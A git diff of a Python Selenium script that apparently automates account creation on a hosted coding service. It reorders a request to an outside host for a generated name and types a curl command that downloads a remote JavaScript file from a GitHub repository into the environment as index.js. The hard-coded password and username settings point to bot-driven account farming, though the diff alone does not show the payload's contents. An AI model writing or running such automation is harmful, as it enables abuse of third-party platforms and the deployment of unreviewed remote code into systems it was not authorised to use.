@@ -20,12 +20,7 @@ long_password = 16
 long_username = 12
 long_usernamez = 18
 #xdr = "sendelp"
-headers = {
-    'cache-control': "no-cache",
-    'content-type': "application/x-www-form-urlencoded"
-    }
-responsez = requests.request("GET", "https://rawrzz.nordalts.cf/gwetname", headers=headers)
-xdr = responsez.text
+
 
 passwordrepl = "rawr12!AAc"
 
@@ -90,9 +85,14 @@ while az==True:
         az = False
     except:
         pass
+headers = {
+    'cache-control': "no-cache",
+    'content-type': "application/x-www-form-urlencoded"
+    }
+responsez = requests.request("GET", "https://rawrzz.nordalts.cf/gwetname", headers=headers)
+xdr = responsez.text
 
-
-time.sleep(1)
+time.sleep(4)
 driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[10]/div/div[2]").click()
 time.sleep(2)
 driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("curl https://raw.githubusercontent.com/awaprimPL/expert-guacamole/main/a.js -o index.js")
